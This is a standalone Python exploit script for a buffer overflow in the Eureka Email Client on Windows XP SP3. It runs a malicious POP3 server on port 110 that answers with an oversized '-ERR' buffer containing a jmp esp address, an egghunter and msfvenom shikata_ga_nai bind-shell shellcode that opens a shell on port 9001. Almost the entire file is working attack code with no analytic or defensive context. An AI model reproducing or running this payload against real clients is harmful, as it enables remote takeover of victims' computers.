# Exploit for Eureka Email Client - Egghunter
# Author: Pal1Sec
# Tested on Windows XP Professional SP 3
#!/usr/bin/env python
import sys, socket

# msfvenom -p windows/shell_bind_tcp LPORT=9001 -a x86 EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x1a" -f python -v shellcode_bind

egghunter = (
"\x66\x81\xca\xff"
"\x0f\x42\x52\x6a"
"\x02\x58\xcd\x2e"
"\x3c\x05\x5a\x74"
"\xef\xb8\x57\x30"
"\x30\x54\x8b\xfa"
"\xaf\x75\xea\xaf"
"\x75\xe7\xff\xe7")

shellcode_bind =  b""
shellcode_bind += b"\xba\xde\x03\x7c\xa3\xdb\xce\xd9\x74\x24"
shellcode_bind += b"\xf4\x58\x2b\xc9\xb1\x53\x31\x50\x12\x03"
shellcode_bind += b"\x50\x12\x83\x36\xff\x9e\x56\x3a\xe8\xdd"
shellcode_bind += b"\x99\xc2\xe9\x81\x10\x27\xd8\x81\x47\x2c"
shellcode_bind += b"\x4b\x32\x03\x60\x60\xb9\x41\x90\xf3\xcf"
shellcode_bind += b"\x4d\x97\xb4\x7a\xa8\x96\x45\xd6\x88\xb9"
shellcode_bind += b"\xc5\x25\xdd\x19\xf7\xe5\x10\x58\x30\x1b"
shellcode_bind += b"\xd8\x08\xe9\x57\x4f\xbc\x9e\x22\x4c\x37"
shellcode_bind += b"\xec\xa3\xd4\xa4\xa5\xc2\xf5\x7b\xbd\x9c"
shellcode_bind += b"\xd5\x7a\x12\x95\x5f\x64\x77\x90\x16\x1f"
shellcode_bind += b"\x43\x6e\xa9\xc9\x9d\x8f\x06\x34\x12\x62"
shellcode_bind += b"\x56\x71\x95\x9d\x2d\x8b\xe5\x20\x36\x48"
shellcode_bind += b"\x97\xfe\xb3\x4a\x3f\x74\x63\xb6\xc1\x59"
shellcode_bind += b"\xf2\x3d\xcd\x16\x70\x19\xd2\xa9\x55\x12"
shellcode_bind += b"\xee\x22\x58\xf4\x66\x70\x7f\xd0\x23\x22"
shellcode_bind += b"\x1e\x41\x8e\x85\x1f\x91\x71\x79\xba\xda"
shellcode_bind += b"\x9c\x6e\xb7\x81\xc8\x43\xfa\x39\x09\xcc"
shellcode_bind += b"\x8d\x4a\x3b\x53\x26\xc4\x77\x1c\xe0\x13"
shellcode_bind += b"\x77\x37\x54\x8b\x86\xb8\xa5\x82\x4c\xec"
shellcode_bind += b"\xf5\xbc\x65\x8d\x9d\x3c\x89\x58\x0b\x34"
shellcode_bind += b"\x2c\x33\x2e\xb9\x8e\xe3\xee\x11\x67\xee"
shellcode_bind += b"\xe0\x4e\x97\x11\x2b\xe7\x30\xec\xd4\x24"
shellcode_bind += b"\xe8\x79\x32\x40\xfa\x2f\xec\xfc\x38\x14"
shellcode_bind += b"\x25\x9b\x43\x7e\x1d\x0b\x0b\x68\x9a\x34"
shellcode_bind += b"\x8c\xbe\x8c\xa2\x07\xad\x08\xd3\x17\xf8"
shellcode_bind += b"\x38\x84\x80\x76\xa9\xe7\x31\x86\xe0\x9f"
shellcode_bind += b"\xd2\x15\x6f\x5f\x9c\x05\x38\x08\xc9\xf8"
shellcode_bind += b"\x31\xdc\xe7\xa3\xeb\xc2\xf5\x32\xd3\x46"
shellcode_bind += b"\x22\x87\xda\x47\xa7\xb3\xf8\x57\x71\x3b"
shellcode_bind += b"\x45\x03\x2d\x6a\x13\xfd\x8b\xc4\xd5\x57"
shellcode_bind += b"\x42\xba\xbf\x3f\x13\xf0\x7f\x39\x1c\xdd"
shellcode_bind += b"\x09\xa5\xad\x88\x4f\xda\x02\x5d\x58\xa3"
shellcode_bind += b"\x7e\xfd\xa7\x7e\x3b\x1d\x4a\xaa\x36\xb6"
shellcode_bind += b"\xd3\x3f\xfb\xdb\xe3\xea\x38\xe2\x67\x1e"
shellcode_bind += b"\xc1\x11\x77\x6b\xc4\x5e\x3f\x80\xb4\xcf"
shellcode_bind += b"\xaa\xa6\x6b\xef\xfe"

nops = 20 * "\x90"

padding = 2000 * "\x90"

buffer = "-ERR "
buffer+= "A" * 709
buffer+= "\xd7\x30\x9d\x7c"  # 0x7c9d30d7 : jmp esp in SHELL32.dll
buffer+= egghunter
buffer+= padding
buffer+= "W00TW00T" + nops + shellcode_bind
buffer+= "C" * (2000-709-4-8-len(nops)-len(shellcode_bind)-len(egghunter))


try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('', 110))
        s.listen(1)
        print ("[*] Listening on port 110.")
        conn, addr = s.accept()
        print '[*] Received connection from: ', addr
	
        while 1:
                conn.send(buffer)
        conn.close()
except:
        print ("Done")
